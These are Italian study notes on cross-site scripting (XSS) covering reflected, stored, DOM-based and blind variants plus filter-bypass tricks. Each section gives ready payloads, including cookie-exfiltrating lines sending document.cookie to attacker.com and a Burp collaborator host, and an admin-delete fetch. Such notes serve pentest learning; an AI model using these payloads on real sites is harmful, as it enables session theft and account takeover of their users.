#Exploit_noti 

---
---
---
#### INDICE
- [[#Introduzione]]
- [[#XSS Reflected]]
- [[#XSS Stored]]
- [[#XSS DOM-Based]]
- [[#XSS Blind]]
- [[#Bypass dei Filtri]]

---
---
---
### Introduzione
La vulnerabilità **XSS (Cross-Site Scripting)** si verifica quando un’applicazione web incorpora input controllato dall’utente in pagine HTML senza un’appropriata sanitizzazione/escaping, permettendo l’esecuzione di codice lato client (solitamente JavaScript) nel contesto del browser di altri utenti. Le conseguenze possono includere furto di sessioni, account takeover, defacement, pivoting verso risorse interne tramite il browser della vittima e raccolta di credenziali.

> [!INFO]
>  **Dove cercare:** parametri GET/POST, campi form, header (es. `Referer`, `User-Agent`), campi profilo/descrizione pubblica, commenti, campi di ricerca, risultati di ricerca

---

### XSS Reflected
Il payload XSS viene incluso direttamente nella richiesta HTTP e riflesso immediatamente nella risposta, senza essere memorizzato sul server.

```
http://site.com/search?q=<script>alert(1)</script>
http://site.com/search?q=<img src=x onerror=alert(1)>
http://site.com/search?q=<svg onload=alert(1)>
```

---
### XSS Stored
Il payload XSS viene salvato sul server (es. in database, commenti, profili) e viene eseguito ogni volta che la pagina vulnerabile viene visitata.

```
Nome: <script>alert('XSS')</script>
Commento: <img src="https://evil.com/x" onerror="stealCookies()">
Profilo: <svg onload="fetch('/admin/delete')">
```

---
### XSS DOM-Based
Il payload viene eseguito a causa di una manipolazione del DOM da parte di JavaScript lato client, senza che il server restituisca direttamente il codice malevolo.

```
# Vulnerable code
document.write('<div>'+ window.location.hash.substring(1) +'</div>');

# Exploit
http://site.com/page#<script>alert(1)</script>
```

---
### XSS Blind
Quando non si vede l'output del payload ma si sospetta che venga eseguito (es. in applicazioni di amministrazione, tool interni), si usano callback esterne per confermare l'esecuzione:

```
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
<img src=x onerror="this.src='http://collaborator.burp/?cookie='+btoa(document.cookie)">
```

---
### Bypass dei Filtri
 filtri anti-XSS spesso bloccano parole chiave come `script`, `onerror`, o caratteri speciali, ma esistono varie tecniche di bypass:

Codificando il payload:

```
<scr&#x69;pt>alert(1)</script>
<img src=x on&#x65;rror=alert(1)>
```

- [lista payload xss](https://github.com/payloadbox/xss-payload-list)

Utilizzando tag meno conosciuti:

```
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
```
